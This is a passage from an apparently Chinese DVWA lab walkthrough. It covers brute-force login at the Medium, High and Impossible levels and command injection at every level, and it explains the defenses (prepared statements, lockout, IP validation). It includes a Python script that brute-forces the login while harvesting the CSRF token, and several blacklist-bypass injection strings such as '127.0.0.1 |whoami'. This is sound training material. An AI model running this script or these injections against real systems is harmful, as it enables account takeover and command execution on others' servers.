title="Medium"></a>Medium</h2><p>与<code>Low</code>的区别就在于这，增加了<code>$user</code>和<code>pass</code>的过滤，<code>mysql_real_escape_string</code>对特殊符号转义，加上对象判断，基本上能防御sql注入。但是并没有增防止加爆破的机制。依然可以通过爆破来爆破出密码，同上不做赘述。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>增加了<code>user_token</code>用于防御CSRF，登陆时需要验证4个参数：<code>username</code>,<code>password</code>,<code>Login</code>,<code>user_token</code>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">   checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sanitise username input</span></span><br><span class="line">   $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">   $user = stripslashes( $user );</span><br><span class="line">   $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sanitise password input</span></span><br><span class="line">   $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">   $pass = stripslashes( $pass );</span><br><span class="line">   $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">   $pass = md5( $pass );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次服务器返回的登陆页面中都会包含一个随机的<code>user_token</code>的值，用户每次登录时都要将<code>user_token</code>一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。token不一致时，会返回</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CSRF token is incorrect</span><br></pre></td></tr></table></figure><p>这个增加了无脑爆破的难度，但是因为生成的<code>user_token</code>是可以在放在前端代码，可以写脚本来爆破，但是直接burpsuite无脑爆肯定是不行的了。</p><p><strong>漏洞利用</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># BruteForce </span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.220.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;security=high; PHPSESSID=igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://192.168.220.1/dvwa/vulnerabilities/brute/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>(<span class="params">url, headers</span>):</span></span><br><span class="line">    req = requests.get(url=url, headers=headers)</span><br><span class="line">    response = req.text</span><br><span class="line">    <span class="comment"># print(response)</span></span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    user_token = soup.form.find_all(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(url,headers)</span><br><span class="line">dic = open(<span class="string">&#x27;3389.txt&#x27;</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="comment"># print(line.strip())</span></span><br><span class="line">    requrl = <span class="string">&quot;http://192.168.220.1/dvwa/vulnerabilities/brute/index.php?username=admin&amp;password=&#123;&#125;&amp;Login=Login&amp;user_token=&#123;&#125;&quot;</span>.format(line.strip(), user_token)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    req = requests.get(requrl, headers)</span><br><span class="line">    print(i,<span class="string">&#x27;admin&#x27;</span>,line.strip(), user_token, req.status_code, len(req.text))</span><br><span class="line">    response = req.text</span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    user_token = soup.form.find_all(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>做了可靠的爆破机制：</p><p>30-38: 如果三次登录失败，就锁定15分钟，避免了无限制爆破。</p><p>每一步的数据库操作，都做了SQL语句的预处理，使用<code>PDO(Php Data Object)</code>防御SQL注入。</p><blockquote><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。</p><p><a href="https://blog.csdn.net/qq_28602957/article/details/51004241">PDO防止sql注入的机制</a></p></blockquote><h1 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h1><p>命令注入，一般在通过php进行系统接口调用的时候容易出现。</p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>stristr — <a href="https://www.php.net/manual/zh/function.strstr.php">strstr()</a> 函数的忽略大小写版本</p><p>stristr ( string <code>$haystack</code> , <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$needle</code> [, bool <code>$before_needle</code> = <strong><code>FALSE</code></strong> ] ) : string</p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函数将返回search参数第一次出现之前的字符串部分。</p></blockquote><p><code>php_uname</code>返回系统信息。这两个函数只是判断一下系统，关键在于<code>shell_exec()</code>函数，直接接受<code>$ip</code>作为参数，没有任何过滤和检查，完全信任用户输入，可以直接<code>&amp;&amp; cmd</code>执行命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/VG8oyqiY1JM6hNB.png"></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>增加了简单的黑名单过滤，将<code>&amp;&amp;和;</code>替换成空值，但是明显是很容易绕过的。比如用&amp;或者双写绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line">   $substitutions = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">   $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; whoami</span><br><span class="line">127.0.0.1 &amp;;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/NYbyJXsAO7fQT82.png"></p><p>这里使用一个<code>&amp;</code>来绕过，但是<code>&amp;&amp;</code>和<code>&amp;</code>是有区别的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd1 &amp;&amp; cmd2cmd1执行成功，再执行cmd2，否则不执行cmd2</span><br><span class="line">cmd1 &amp; cmd2cmd1和cmd2都要执行</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;ping 12345 &amp;&amp; whoami</span><br><span class="line"></span><br><span class="line">正在 Ping 0.0.48.57 具有 32 字节的数据:</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line"></span><br><span class="line">0.0.48.57 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 &#x3D; 4，已接收 &#x3D; 0，丢失 &#x3D; 4 (100% 丢失)，</span><br><span class="line"></span><br><span class="line">C:\Users\DELL&gt;ping 12345 &amp; whoami</span><br><span class="line"></span><br><span class="line">正在 Ping 0.0.48.57 具有 32 字节的数据:</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line"></span><br><span class="line">0.0.48.57 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 &#x3D; 4，已接收 &#x3D; 0，丢失 &#x3D; 4 (100% 丢失)，</span><br><span class="line">desktop-iknkost\dell</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure><p>扩大了黑名单的范围，用<code>trim</code>去除字符串尾部的空白字符或者换行符等。</p><p>这里只过滤的<code>| </code>（|后面一个空格），但是还存在<code> |</code>（|前面有一个空格）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 |whoami</span><br><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><blockquote><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p></blockquote><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">&quot;.&quot;</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>stripslashes(string)</code></p><p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p><code>explode(separator,string,limit)</code></p><p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p></blockquote><p>通过<code>.</code>分割IP，然后判断IP每个部分是否是数字，不是就报错。防御住命令注入。</p><h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><blockquote><p>CSRF，全称Cross-site request 